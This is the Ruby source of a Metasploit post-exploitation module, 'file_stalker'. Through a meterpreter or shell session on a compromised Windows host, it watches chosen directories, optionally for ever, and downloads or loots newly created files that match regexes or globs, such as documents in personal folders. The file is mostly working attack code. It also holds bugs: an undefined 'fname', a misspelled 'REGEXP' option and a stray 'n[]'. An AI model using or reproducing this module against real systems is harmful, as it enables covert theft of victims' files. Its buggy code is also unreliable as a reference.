### $Id: file_stalker.rb 12468 2011-04-29 16:10:29Z hdm $
##

# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
#require 'msf/core/post/file'
require 'rex/post/file'
require 'rex'

class Metasploit3 < Msf::Post

#	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Stalk a directory for particular files',
			'Description'    => %q{ This module will monitor for and collect files from specified directories },
			'License'        => MSF_LICENSE,
			'Author'         => 
				[
					'kernelsmith',
					'hdm',	# Based loosely on hdm's ios backup module which is
					'bannedit' # Based on bannedit's pidgin_cred module structure 
				],
			'Version'        => '$Revision: 1 $',
			'Platform'       => ['windows'],
			'SessionTypes'   => ['meterpreter' ]
		))
		register_options(
			[
				OptString.new('DIRS', [true, 'Directories to stalk', '']),
				OptInt.new('DEPTH', [true, 'Depth at which to recurse (-1 is infinite, 0 is none)', 0]),
				OptString.new('REGEX', [false, 'Collect files that match this regex (ORd with any globbing)','']),
				OptString.new('GLOBS', [false, 'Collect files that match these globs, comma separated (ORd with any REGEX)','']),
				OptInt.new('DURATION', [true, 'How long, in seconds, to keep stalking (-1 is infinite, 0 is run once)', -1]),
				OptBool.new('EXAMPLES', [false, 'Do not run the module, just show me some example usage',false]),
				OptInt.new('DELAY',[false, 'Delay, in secs, between file system queries',0]),
				OptBool.new('LOOT',[true, 'Loot the files instead of a simple download',false]),
				OptBool.new('ALWAYS',[true, 'Always download file that matches, even if not new' ,false]),
				OptBool.new('DEBUG', [false, 'Verbose output for debugging',true])
			], self.class)
	end

	#
	# Windows is officially supported, other OSs/filesystems are in progress
	# 
	#
	def run
		if datastore['EXAMPLES'] == true
			print_status("run -j -o DIRS='C:\\Documents and Settings,C:\\docs',REGEX='sec|fin',DEPTH=2,DURATION=-1")
			print_status("- OR -")
			print_status("set DIRS 'C:\\Documents and Settings,C:\\docs'")
			print_status("set DEPTH 2")
			print_status("set GLOBS '*.doc',''")
			print_status("set DURATION -1")
			print_status("run -j")
			print_status('Run forever as a job, monitor C:\Documents and Settings\ and C:\docs\, ' +
							'recursing two levels down, for any newly created files that match sec or fin ' +
							'(ignores files present when the script starts, only gets new ones)')
			print_line()
			print_status("run -o DIRS='D:\\personal',GLOBS='*.doc,*.txt',DURATION=0")
			print_status('Run once, get all files matching *.doc or *.txt in D:\personal\, do not recurse')
			return
		end
		# validate options
		# raise option error if REGEX and GLOBS are empty
		if ( datastore['REGEX'].empty? && datastore['GLOBS'].empty? )
			raise(ArgumentError, "REGEX and GLOBS can't both be empty")
		end
		
		@paths_arr= datastore['DIRS'].split(',')
		@delay = datastore['DELAY'] || 0
		@depth = datastore['DEPTH'] || 0
		@current_depth = 0
		stalk(@paths_arr) unless @paths_arr.empty?
		
	end  #end of run
	
	def session_file_join(*a)
		fsep = '|'
		case session.platform
		when /win/
			fsep = '\\'
		else
			fsep = '/'
		end
		dirty = a.join(fsep)
		#normalize in case joining partial directories, with diff numbers of slashes
		case session.platform
		when /win/
			# normalize any number of win slashes to one slash, then replace with two
			clean = dirty.squeeze('\\').gsub(/\\/,'\\\\')
		else
			# TODO:  This might need work, for now just turn any number of '/'s to just one
			clean = dirty.squeeze('/')
		end
		clean
	end
	
	def bug(*a)
		return if not datastore['DEBUG']
		string = ''
		a.each do |thing| 
			string << thing.to_s
		end
		print_status("DEBUG:  #{string}")
	end
	
	def downleezy(file)
		if not file
			print_error("Filename not provided")
			return
		elsif datastore['LOOT']
			print_status("Looting #{file}...")

			begin
				fdata = ""
				if session.type == "shell"
					fdata = session.shell_command("cat #{file}")
				else
					mfd = session.fs.file.new("#{fname}", "rb")
					until mfd.eof?
						fdata << mfd.read
					end
					mfd.close
				end
				rname = file || "unknown.bin"
				rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/_+/, "_")			
				ctype = "application/octet-stream"
			
				store_loot("ltypeOID", ctype, session, fdata, rname, "stalked file #{rname}")
		
			rescue ::Interrupt 
				raise $!
			rescue ::Exception => e
				print_error("Failed to loot #{file}: #{e.class} #{e}")
			end
		else
			print_status("Downloading #{file} to current working directory")
			begin
				session.fs.file.download('./', file)
			rescue ::Interrupt 
				raise $!
			rescue ::Exception => e
				print_error("Failed to download #{file}: #{e.class} #{e}")
			end		
		end
	end
		
	def stalk(paths)
		# TODO: confirm atleast one valid directory?  If not, error
		@paths = paths
		bug("Paths are: #{@paths}")
		# TODO: remove any path from @paths that's not valid, warn about it?
		
		glob_arr = datastore['GLOBS'].split(',')
		combo = "#{datastore['REGEXP']}" || ''
		# this is ghetto
		glob_arr.each do |glob|
			if combo.empty?
				combo = ".#{glob}$" 
			else
				combo = "#{combo}|.#{glob}$"
			end
		end
		
		bug("combo is #{combo}")
		@pattern = Regexp.new(combo)
		bug("pattern is #{@pattern}")
		
		#
		# get INITIAL file listing and match against pattern
		#
		@initial = []
		@delta = []
		begin
			@initial = scrape(@paths,datastore['ALWAYS'])
		rescue Rex::Post::Meterpreter::RequestError
			# Handle directories that do not exist
		ensure
			# reset depths
			@depth = datastore['DEPTH'] || 0
			@current_depth = 0
		end
		
		bug("Initially found: #{@initial}")
		
		#
		# DELTA, periodically get file listing and match against pattern
		#
		if datastore['DURATION'] != 0
			start = Time.new()
			print_status("Stalking files, start time:  #{start}")

			# trap to gracefully handle user forcefully terminating me
			trapped = false
			Kernel.trap( "INT" ) { trapped = true }
			while ( !trapped and ((Time.new - start) < datastore['DURATION'] or datastore['DURATION'] == -1) )
				begin
					@delta += scrape(@paths)
					select(nil, nil, nil, @delay)
				rescue Rex::Post::Meterpreter::RequestError
					# Handle directories that do not exist
				end
				# reset depths
				@depth = datastore['DEPTH'] || 0
				@current_depth = 0
			end
			bug("Elapsed time = #{Time.new - start}")
			print_status("During that time I also found: #{@delta}")
		end
	end
	
	def scrape(dirs=n[], download=true)
		# dirs is an array and should ieally be a full paths
		return if dirs.empty?
		dirs_to_recurse = []
		delta = []
	
		dirs.each do |adir|
			bug("Processing #{adir}")
			files = session.fs.dir.entries(adir)
			# do a level
			files.each do |f|
				next if f =~ /^(\.|\.\.)$/ # ignore entries like . and ..
				fullname = session_file_join(adir,f)
	
				# stage recursion if recursion not exceeded and file is a dir
				if (@current_depth < @depth and session.fs.filestat.new(fullname).directory?)
					dirs_to_recurse << fullname
				elsif (@pattern.match(f) and not @initial.include?(fullname) and not @delta.include?(fullname))
					downleezy(fullname) if download # download that baby
					delta << fullname # add to delta list
				end
			end
		end
		@current_depth += 1 # increment depth to next level
		if not dirs_to_recurse.empty?
			delta += scrape(dirs_to_recurse,download)
			# union,|, would get rid of duplicates, but I assume it's slower?
		end
		delta.flatten
	end
end
